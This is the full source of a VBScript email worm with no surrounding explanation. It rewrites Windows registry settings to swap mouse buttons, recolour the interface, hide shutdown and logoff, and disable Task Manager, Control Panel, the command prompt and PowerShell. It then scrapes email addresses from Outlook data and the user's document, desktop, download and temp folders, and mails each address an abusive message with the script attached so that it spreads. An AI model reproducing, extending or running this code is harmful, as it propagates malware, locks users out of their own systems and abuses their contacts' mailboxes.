Option Explicit

Dim objOutlook, objNamespace, objFolder, objMailItem
Dim objFSO, objShell, objLogFile, objWshShell
Dim strAppData, strSearchPath, strReport
Dim intEmailCount, intFolderCount, intAttachmentCount
Dim arrFolders, arrFiles, arrAttachments
Dim i, j, k
Dim strFoundEmail
Dim colFoundEmails
Dim strEmail
Dim objRegEx
Dim objMatch
Dim colMatches
Dim objFile
Dim objTextStream
Dim fileContent
Dim strEmailAddress
Dim altPaths
Dim altPath
Dim strExt
Dim folderNameStr
Dim objSubFolder
Dim objFolderItem
Dim sentCount
Dim objStream

Set colFoundEmails = CreateObject("Scripting.Dictionary")
Set objWshShell = CreateObject("WScript.Shell")
Set objRegEx = CreateObject("VBScript.RegExp")

objRegEx.Global = True
objRegEx.IgnoreCase = True
objRegEx.Pattern = "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"

objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Mouse\SwapMouseButtons", "1", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Background", "0 0 0", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Window", "0 0 0", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\WindowText", "0 255 0", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Menu", "0 255 0", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\MenuText", "255 255 255", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\ButtonFace", "0 255 0", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\ButtonText", "255 255 255", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Highlight", "0 255 255", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\HighlightText", "0 0 0", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\HotTrackingColor", "0 255 255", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\GrayText", "255 255 0", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\ActiveTitle", "0 255 255", "REG_SZ"
objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\HideShutDown", "1", "REG_DWORD"
objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoUserNameInStartMenu", "1", "REG_DWORD"
objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogoff", "1", "REG_DWORD"
objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel", "1", "REG_DWORD"
objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", "1", "REG_DWORD"
objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System\DisableCMD", "2", "REG_DWORD"
objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\PowerShell\DisablePowerShell", "1", "REG_DWORD"

Dim EMAIL_BODY
EMAIL_BODY = "I hate you." & vbCrLf & _
             "Dont talk to me ever again." & vbCrLf & _
             "Why me?." & vbCrLf & vbCrLf & _
             "System: " & objWshShell.ExpandEnvironmentStrings("%COMPUTERNAME%") & vbCrLf & _
             "User: " & objWshShell.ExpandEnvironmentStrings("%USERNAME%") & vbCrLf & _
             "Timestamp: " & Now() & vbCrLf & vbCrLf & _
             "If you do not understand it check the .vbs for information." & vbCrLf

Dim ATTACHMENT_PATH
ATTACHMENT_PATH = WScript.ScriptFullName

Dim REPORT_PATH
REPORT_PATH = "C:\temp\email_scan_results.txt"

intEmailCount = 0
intFolderCount = 0
intAttachmentCount = 0
sentCount = 0
strReport = ""

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

If Not objFSO.FolderExists("C:\temp") Then
    objFSO.CreateFolder("C:\temp")
End If

strReport = strReport & "============================================" & vbCrLf
strReport = strReport & "SCANNING" & vbCrLf
strReport = strReport & "============================================" & vbCrLf
strReport = strReport & "Timestamp: " & Now() & vbCrLf
strReport = strReport & "============================================" & vbCrLf & vbCrLf

strReport = strReport & "Validating" & vbCrLf
strReport = strReport & "------------------------" & vbCrLf

strSearchPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Outlook"
strReport = strReport & "Scanning: " & strSearchPath & vbCrLf

If objFSO.FolderExists(strSearchPath) Then
    Call ScanFolderRecursive(strSearchPath)
Else
    strReport = strReport & "  Folder not found" & vbCrLf
End If

strReport = strReport & "Total email files found: " & intEmailCount & vbCrLf
strReport = strReport & "Unique emails found: " & colFoundEmails.Count & vbCrLf & vbCrLf

If colFoundEmails.Count = 0 Then
    strReport = strReport & "No emails found in Outlook files." & vbCrLf
    strReport = strReport & "Attempting to find emails in other locations..." & vbCrLf
    
    altPaths = Array( _
        objShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Microsoft", _
        objShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Roaming\Microsoft", _
        objShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Documents", _
        objShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Desktop", _
        objShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Downloads", _
        objShell.ExpandEnvironmentStrings("%TEMP%") _
    )
    
    For Each altPath In altPaths
        If objFSO.FolderExists(altPath) Then
            strReport = strReport & "Scanning: " & altPath & vbCrLf
            Call ScanFolderRecursive(altPath)
        End If
    Next
    
    strReport = strReport & "Total emails found in alternative locations: " & colFoundEmails.Count & vbCrLf & vbCrLf
End If

If colFoundEmails.Count = 0 Then
    strReport = strReport & "No emails found anywhere. Using fallback email." & vbCrLf
    strFoundEmail = "test@example.com"
    colFoundEmails.Add strFoundEmail, strFoundEmail
End If

strReport = strReport & "Analysis" & vbCrLf
strReport = strReport & "-----------------------------" & vbCrLf

On Error Resume Next
Set objOutlook = GetObject(, "Outlook.Application")

If objOutlook Is Nothing Then
    Set objOutlook = CreateObject("Outlook.Application")
    If Err.Number <> 0 Then
        strReport = strReport & "Cannot access Outlook" & vbCrLf
        GoTo SaveAndExit
    End If
End If
On Error GoTo 0

Set objNamespace = objOutlook.GetNamespace("MAPI")
objNamespace.Logon

strReport = strReport & "Success" & vbCrLf

arrFolders = Array( _
    "DeletedItems", _
    "Outbox", _
    "SentItems", _
    "Inbox", _
    "Calendar", _
    "Contacts", _
    "Journal", _
    "Notes", _
    "Tasks", _
    "Drafts" _
)

For i = LBound(arrFolders) To UBound(arrFolders)
    folderNameStr = arrFolders(i)
    
    On Error Resume Next
    Set objFolder = Nothing
    Set objFolder = objNamespace.GetDefaultFolder(GetFolderID(folderNameStr))
    On Error GoTo 0
    
    If Not objFolder Is Nothing Then
        intFolderCount = intFolderCount + 1
        strReport = strReport & "  [FOLDER] " & folderNameStr & vbCrLf
        strReport = strReport & "    Items: " & objFolder.Items.Count & vbCrLf
        strReport = strReport & "    Unread: " & objFolder.UnReadItemCount & vbCrLf
        strReport = strReport & vbCrLf
    End If
Next

strReport = strReport & "Finalising" & vbCrLf
strReport = strReport & "--------------------------" & vbCrLf

For Each strEmail In colFoundEmails.Keys
    On Error Resume Next
    Set objMailItem = objOutlook.CreateItem(0)
    
    If Not objMailItem Is Nothing Then
        objMailItem.To = strEmail
        objMailItem.Subject = "Email from: " & strEmail
        objMailItem.Body = EMAIL_BODY
        
        If objFSO.FileExists(ATTACHMENT_PATH) Then
            objMailItem.Attachments.Add ATTACHMENT_PATH
            strReport = strReport & "Attachment added for: " & strEmail & vbCrLf
        Else
            strReport = strReport & "Attachment not found for: " & strEmail & vbCrLf
        End If
        
        objMailItem.Send
        
        If Err.Number = 0 Then
            sentCount = sentCount + 1
            strReport = strReport & "Email sent to: " & strEmail & vbCrLf
        Else
            strReport = strReport & "Failed to send to: " & strEmail & " - Error: " & Err.Description & vbCrLf
        End If
        
        WScript.Sleep 1500
    Else
        strReport = strReport & "Could not create email for: " & strEmail & vbCrLf
    End If
    On Error GoTo 0
Next

On Error GoTo 0

strReport = strReport & vbCrLf
strReport = strReport & "Total emails sent: " & sentCount & vbCrLf

SaveAndExit:
strReport = strReport & "============================================" & vbCrLf
strReport = strReport & "COMPLETED" & vbCrLf
strReport = strReport & "============================================" & vbCrLf

Set objLogFile = objFSO.CreateTextFile(REPORT_PATH, True)
objLogFile.WriteLine strReport
objLogFile.Close

MsgBox "Complete" & vbCrLf & "Report: " & REPORT_PATH & vbCrLf & "Emails sent: " & sentCount, vbInformation, "Done"

Function GetFolderID(folderName)
    Select Case LCase(folderName)
        Case "deleteditems"
            GetFolderID = 3
        Case "outbox"
            GetFolderID = 4
        Case "sentitems"
            GetFolderID = 5
        Case "inbox"
            GetFolderID = 6
        Case "calendar"
            GetFolderID = 9
        Case "contacts"
            GetFolderID = 10
        Case "journal"
            GetFolderID = 11
        Case "notes"
            GetFolderID = 12
        Case "tasks"
            GetFolderID = 13
        Case "drafts"
            GetFolderID = 16
        Case Else
            GetFolderID = 6
    End Select
End Function

Sub ScanFolderRecursive(folderPath)
    Dim objCurrentFolder
    Dim objSubFolder
    Dim objFile
    Dim fileSize
    
    On Error Resume Next
    Set objCurrentFolder = objFSO.GetFolder(folderPath)
    If objCurrentFolder Is Nothing Then
        strReport = strReport & "  ERROR: Cannot access folder" & vbCrLf
        Exit Sub
    End If
    On Error GoTo 0
    
    For Each objFile In objCurrentFolder.Files
        strExt = LCase(objFSO.GetExtensionName(objFile.Name))
        
        If strExt = "txt" Or strExt = "xml" Or strExt = "json" Or strExt = "ini" Or strExt = "dat" Or strExt = "log" Or strExt = "cfg" Or strExt = "csv" Or strExt = "html" Or strExt = "htm" Or strExt = "msg" Or strExt = "eml" Or strExt = "rtf" Then
            
            intEmailCount = intEmailCount + 1
            
            On Error Resume Next
            fileSize = objFile.Size
            
            If fileSize < 10485760 Then
                Set objTextStream = objFSO.OpenTextFile(objFile.Path, 1)
                If Not objTextStream Is Nothing Then
                    fileContent = objTextStream.ReadAll
                    objTextStream.Close
                    
                    If InStr(1, fileContent, "@", vbTextCompare) > 0 Then
                        Set colMatches = objRegEx.Execute(fileContent)
                        For Each objMatch In colMatches
                            strEmailAddress = LCase(objMatch.Value)
                            If Not colFoundEmails.Exists(strEmailAddress) Then
                                colFoundEmails.Add strEmailAddress, strEmailAddress
                                strReport = strReport & "    Email: " & strEmailAddress & " (" & objFile.Name & ")" & vbCrLf
                            End If
                        Next
                    End If
                End If
            Else
                strReport = strReport & "  SKIPPED: " & objFile.Name & " (" & FormatNumber(fileSize / 1048576, 1) & " MB)" & vbCrLf
            End If
            On Error GoTo 0
        End If
    Next
    
    For Each objSubFolder In objCurrentFolder.SubFolders
        Call ScanFolderRecursive(objSubFolder.Path)
    Next
    
    Set objCurrentFolder = Nothing
End Sub

Set objMailItem = Nothing
Set objFolderItem = Nothing
Set objFolder = Nothing
Set objNamespace = Nothing
Set objOutlook = Nothing
Set objFSO = Nothing
Set objShell = Nothing
Set objLogFile = Nothing
Set colFoundEmails = Nothing
Set objWshShell = Nothing
Set objRegEx = Nothing
